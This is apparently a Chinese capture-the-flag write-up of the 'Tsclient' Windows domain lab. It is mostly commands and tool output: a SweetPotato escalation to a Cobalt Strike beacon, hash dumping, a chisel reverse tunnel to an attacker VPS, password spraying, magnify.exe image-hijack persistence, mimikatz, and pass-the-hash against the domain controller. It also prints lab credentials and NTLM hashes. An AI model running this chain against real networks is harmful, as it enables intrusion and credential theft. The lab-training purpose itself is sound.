---
title: 春秋云境-Tsclient
subtitle:
date: 2025-03-14T14:54:23+08:00
slug: dea3a3c
draft: false
author:
  name: T1ng
  link:
  email:
  avatar: /images/avater.jpg
description:
keywords:
license:
comment: false
weight: 0
tags:
  - 春秋云境
categories:
  - 春秋云境
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRelated: false
hiddenFromFeed: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter
---

<!--more-->

<!-- Place resource files in the current article directory and reference them using relative paths, like this: `![alt](images/screenshot.jpg)`. -->

访问发现是Windows主机，但并没有什么有用的信息



![](images/9226450074ff5fe86d440023bee438c2.png)





![](images/9a5a5f3b505e880a061b8beb9cb67e6e.png)

fscan开扫，发现m ssql数据库用户名和密码，MDUT拿到Shell。

![](images/70bafd8876ceab5b38ce3b73f4fd15d1.png)

执行whoami查看用户，发现是sqlserver，权限较低。

![](images/41c5e43947475ec601b8f47f3087e1f4.png)

尝试利用Sweetpotato进行提权。

![](images/9e92ad40940c2791d0decca455d50e5a.png)

命令执行 C:/Users/Public/SweetPotato.exe -a "whoami"

![](images/19793dc78c31307c764a69dba50ba21c.png)

发现可以正常执行，上传cs马，执行cs马

```
C:/Users/Public/SweetPotato.exe -a "C:/Users/Public/beacon_x64.exe"
```



![](images/be593718352129c88d17556a2935f4da.png)

cs成功上线

![](images/f23ce3745e2757e875150fbc6c667ebb.png)

执行命令，得到flag1

```
shell type C:\Users\Administrator\flag\flag01.txt
```



![](images/448b26a2fc9c76077e5c18a77792db2e.png)



```
hashdump
```

```
[03/08 16:09:01] beacon> hashdump
[03/08 16:09:01] [*] Tasked beacon to dump hashes
[03/08 16:09:59] [+] host called home, sent: 82541 bytes
[03/08 16:10:01] [+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2caf35bb4c5059a3d50599844e2b9b1f:::
cxcx:1013:aad3b435b51404eeaad3b435b51404ee:72d98c440b25ce7b05d81233044c020c:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
John:1008:aad3b435b51404eeaad3b435b51404ee:eec9381b043f098b011be51622282027:::
```

查看网络连接等

```
shell netstat -ano
```



![](images/79888364eb73aae0090bc62bc7a4f4e1.png)

看到3389端口指向`172.22.8.31`另一个主机
查看在线用户

```
shell quser || qwinst
```



![](images/7b03f99152439c5df719fd52401c4b6b.png)

发现john用户，可以cs注入进程进行上线。

![](images/d88bcd0245f711a689e037faad597c33.png)

成功上线John

![](images/6bb36f84fc16aba7f4b50344a16b494a.png)

查看共享资源，列出目录文件

```
shell net use
shell dir \\tsclient\c
```



![](images/3bdd3725a5d57a1b4e3d188453adf099.png)

读取文件，拿到账号密码，并提醒映像劫持

```
shell type \\tsclient\c\credential.txt
```

```
03/08 16:20:22] beacon> shell type \\tsclient\c\credential.txt
[03/08 16:20:23] [*] Tasked beacon to run: type \\tsclient\c\credential.txt
[03/08 16:21:11] [+] host called home, sent: 63 bytes
[03/08 16:21:11] [+] received output:
xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#

Do you know how to hijack Image?
```

上传`chisel.exe`和`fscan`，扫描内网并进行内网穿透
先进行fscan扫描内网

```
shell C:\\Users\\Public\\t1ng\\fscan.exe -h 172.22.8.0/24
```

```
[03/08 16:32:37] beacon> shell C:\\Users\\Public\\fscan.exe -h 172.22.8.0/24
[03/08 16:32:38] [*] Tasked beacon to run: C:\\Users\\Public\\fscan.exe -h 172.22.8.0/24
[03/08 16:33:15] [+] host called home, sent: 82 bytes
[03/08 16:33:25] [+] received output:

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.22.8.18     is alive
(icmp) Target 172.22.8.15     is alive
(icmp) Target 172.22.8.31     is alive
(icmp) Target 172.22.8.46     is alive
[*] Icmp alive hosts len is: 4
172.22.8.46:445 open
172.22.8.18:1433 open
172.22.8.31:445 open
172.22.8.15:445 open
172.22.8.18:445 open
172.22.8.46:139 open
172.22.8.15:139 open
172.22.8.31:139 open
172.22.8.15:88 open
172.22.8.46:135 open
172.22.8.31:135 open
172.22.8.18:139 open
172.22.8.15:135 open
172.22.8.18:135 open
172.22.8.46:80 open
172.22.8.18:80 open
[*] alive ports len is: 16
start vulscan
[*] NetInfo 
[*]172.22.8.46
   [->]WIN2016
   [->]172.22.8.46
[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01           
[*] NetInfo 
[*]172.22.8.18
   [->]WIN-WEB
   [->]172.22.8.18
   [->]2001:0:348b:fb58:3430:be2:d89c:72b2
[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server
[*] NetInfo 
[*]172.22.8.31
   [->]WIN19-CLIENT
   [->]172.22.8.31
[*] NetInfo 
[*]172.22.8.15
   [->]DC01
   [->]172.22.8.15
[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         
[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393
[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server
[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ
```

`chisel`内网穿透

```
靶机
shell C:\\Users\\Public\\chisel.exe client vps_ip:9002 R:0.0.0.0:9003:socks

vps
./chisel server -p 9002 --reverse
```

利用cme进行密码喷射

```
proxychains4 -q crackmapexec smb 172.22.8.0/24 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#'
```



![](images/02e6886ee760160c87849c925d3218c8.png)

发现可以登录`172.22.8.46`主机，但是会显示密码过期，使用`smbpasswd`修改密码
[Lex-Case/Impacket: Impacket is a collection of Python classes for working with network protocols.](https://github.com/Lex-Case/Impacket/tree/master)

```
proxychains4 -q python3 smbpasswd.py xiaorang.lab/Aldrich:'Ald@rLMWuy7Z!#'@172.22.8.46 -newpass 'QWERqwer1234'
```



![](images/83f17f9a75e9b9728c53d436197877f0.png)

RDP远程桌面连接

```
proxychains4 rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p 'QWERqwer1234' -r disk:share=/home/kali/Desktop/tmp
```



![](images/62d5e47ec79406a42c2e6e29100a880a.png)



映像劫持，利用放大镜提权
[映像劫持的几种利用方式 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/321211.html)

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
```



![](images/5aa6c8fcc38be58e66ac5f472bdacdb4.png)

开始，锁定

![](images/8dcfc0a28c64e2fda7f6a5a8297f82f9.png)

点击放大镜

![](images/c1c5d44ede8c677c4010c68f4971f4a2.png)



![](images/43ae04d7128b1df7c451a202277ff99e.png)

成功提权，读flag02

```
type C:\User\Administrator\flag\flag02.txt
```



![](images/feff7846d15fa619bb16a8660b525cb5.png)

尝试查看主机是否出网，

![](images/6be329c8f1ddbc9687e9c609491a6486.png)

 上传`mimikatz`，同样位置执行

 ```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit
 ```

拿到用户名和NTML哈希，哈希传递

![](images/366b773d340839607a2191e9bc01347f.png)

拿PTH打DC

```
proxychains4 crackmapexec smb 172.22.8.15 -u WIN2016$ -H b5a0472a0c4933f0d50b7c499d267e0f -d xiaorang -x "type C:\Users\Administrator\flag\flag03.txt"
```



![](images/784de068039ffc9e1edaeaa809d34014.png)

